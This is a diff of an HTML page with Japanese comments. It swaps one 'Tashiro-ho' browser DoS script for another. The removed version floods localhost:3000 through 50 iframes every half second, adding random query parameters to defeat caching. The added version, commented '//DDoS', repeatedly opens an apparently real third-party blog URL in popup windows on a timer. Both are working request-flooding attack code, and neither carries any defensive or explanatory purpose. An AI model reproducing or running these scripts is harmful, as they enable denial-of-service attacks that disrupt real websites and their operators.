@@ -1,35 +1,39 @@
-<html>
+<!--■■■初期値■■■-->
+<script>
+var attackURL='https://eeai.hatenablog.com/';
+var interval=10000;//1秒=1000
+</script>
 
-<body>
-  <div id="iframe-container"></div>
-  <script>
-    // iframe要素を50個生成する
-    const numberOfIframe = 50;
-    const iframeContainer = document.getElementById("iframe-container");
-    for (let i = 0; i < numberOfIframe; i++) {
-      const iframeElement = document.createElement("iframe");
-      iframeElement.width = 10;
-      iframeElement.height = 10;
-      iframeElement.name = "iframe-to-attack";
-      iframeContainer.append(iframeElement);
-    }
-    const iframeElements = document.getElementsByName("iframe-to-attack");
-    /**
-     * 攻撃用の関数
-     * 1回の攻撃で上で生成したiframe要素の数だけリクエストを生成する
-     */
-    function attack() {
-      for (let iframeElement of iframeElements) {
-        // 田代砲の被害に遭うURL
-        const victim = "http://localhost:3000";
-        // ブラウザのキャッシュ機能を無効化するためにダミーのクエリパラメータを付与する
-        iframeElement.contentWindow.location.href = `${victim}?dummy_param=${Math.random()}`;
-      }
-    }
-    // 0.5秒に1回攻撃する
-    const attackInterval = 0.5 * 1000;
-    setInterval(attack, attackInterval);
-  </script>
-</body>
+<!--▼▼▼田代砲ソースコード▼▼▼-->
+<!--初期画面-->
+<script>
+var txt ='<tt>'
+        +'<br>AttackURL：'+attackURL
+        +'<br>AttackInt：'+(interval/1000)+'秒'
+        +'</tt>'
+        ;
+document.write(txt);
+</script>
 
-</html>
+<!--処理-->
+<script>
+var i=0;
+function zp(i){if(i<1000){return ('00'+i).slice(-3);}else{return i;}}
+function tt(att){return '<tt style="font-size:xx-small;'+att+'">';}
+  
+window.setInterval(function(){
+  //初期画面の転写
+  if(i==0){document.write(txt+'<br>');}
+  
+  //DDoS
+  window.open(attackURL,null,'top=0,left=0,width=100,height=100');
+  
+  //ループ回数表示
+  i++;
+  if(i%100==1){document.write(tt("color:red;")+(i-1)+'</tt><br>');}
+  document.write(tt()+zp(i)+' '+'</tt>');
+  if(i%25==0){document.write('<br>');}  
+  scrollTo(0,i*10);
+}, interval);
+</script>
+<!--▲▲▲田代砲ソースコード▲▲▲-->
